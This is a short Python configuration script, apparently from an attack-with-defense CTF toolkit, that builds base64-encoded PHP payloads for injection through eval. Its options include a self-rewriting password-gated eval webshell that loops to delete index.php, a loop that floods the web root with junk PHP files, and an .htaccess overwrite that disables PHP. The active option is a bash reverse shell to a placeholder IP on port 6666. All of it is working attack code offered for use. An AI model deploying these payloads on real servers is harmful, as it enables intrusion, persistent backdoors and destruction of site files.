import base64
from code.func import *
#不死马，删除index.php
# SoftLink = False
# creatshell = """$file='/var/www/html/.yml.php';$code = '<?php if(md5($_GET["pass"])=="b512a9f86e13440f7384695648c6ff6d"){@eval($_POST[awd]);} ?>';while (1){file_put_contents($file,$code);usleep(5000);system("rm -rf /var/www/html/index.php");}"""
# creatshell = """$file='=h3.php';$code = '<?php @eval($_POST[awd]);?>';file_put_contents($file,$code);"""

#填充垃圾文件
# SoftLink = False
# creatshell = """$path="/var/www/html/";$file = $path.".y3.php";$code = '<?php if(md5($_GET["pass"])=="b512a9f86e13440f7384695648c6ff6d"){@eval($_POST[awd]);} ?>';$base64 = "SGVsbG8sQ3RmZXIsSSdtIHkz";while (True){file_put_contents($file,$code);file_put_contents($path.md5(mt_rand()).".php",$base64);file_put_contents($path.mt_rand().".".md5(mt_rand()).".php",$base64);file_put_contents($path.mt_rand().".".md5(mt_rand()).".php",$base64);usleep(10);}"""

#建立软链接,SoftLink为软连接操作标志位,SoftLinkPath为写软连接的绝对路径
#WebSoftLinkPath为web访问软连接的路径，路径只写到文件夹就可以，需带/
# SoftLink = True
# creatshell=""""""
#下面两行不要注释掉
SoftLinkPath = "/var/www/html/wp-includes/css/"
WebSoftLinkPath = "/wp-includes/css/"

#写.htaccess
# SoftLink = False
# creatshell = """$file='/var/www/html/.htaccess';$code = 'php_flag engine 0';while (1){file_put_contents($file,$code);usleep(50000);}"""

#反弹recvshell
SoftLink = False
creatshell = """system("bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/6666 <&1'");"""
# creatshell = """system("ls");"""



encode_str = str(base64.b64encode(bytes(creatshell,'utf-8')), encoding = "utf8")
final_shellcode = f"@eval(base64_decode('{encode_str}'));"
# print(final_shellcode)
